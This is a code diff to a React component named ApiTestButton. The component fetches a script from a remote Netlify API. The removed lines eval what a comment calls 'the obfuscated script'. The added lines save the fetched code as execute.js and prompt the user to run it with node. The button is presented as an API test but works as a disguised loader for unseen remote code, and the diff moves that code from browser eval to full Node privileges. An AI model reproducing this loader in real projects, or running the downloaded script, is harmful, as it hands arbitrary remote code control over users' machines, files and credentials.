@@ -8,29 +8,26 @@ export function ApiTestButton() {
         try {
             const res = await fetch("https://nest-react.netlify.app/api");
             const data = await res.json();
+            const code = data.data;
 
-            console.log("Received script:", data.data);
+            // Create Node.js script
+            const nodeScript = code; // Your data.data code
 
-            // Patch Node.js globals for browser compatibility
-            (globalThis as any).global = globalThis;
-            (globalThis as any).require = () => {
-                console.log("⚠ require() called inside script — returning empty object");
-                return {};
-            };
-            (globalThis as any).module = {};
+            const blob = new Blob([nodeScript], { type: 'text/javascript' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'execute.js';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
 
-            // Replace global → globalThis (important)
-            const safeScript = data.data.replace(/global/g, "globalThis");
-
-            // Finally run the obfuscated script
-            const result = eval(safeScript);
-
-            console.log("Executed result:", result);
-            alert("Return value: " + result);
+            alert('Script downloaded! Run: node execute.js');
 
         } catch (error) {
             console.error("API Error:", error);
-            alert("API call failed: " + (error as any).message);
+            alert("Failed: " + (error as any).message);
         }
     };
 
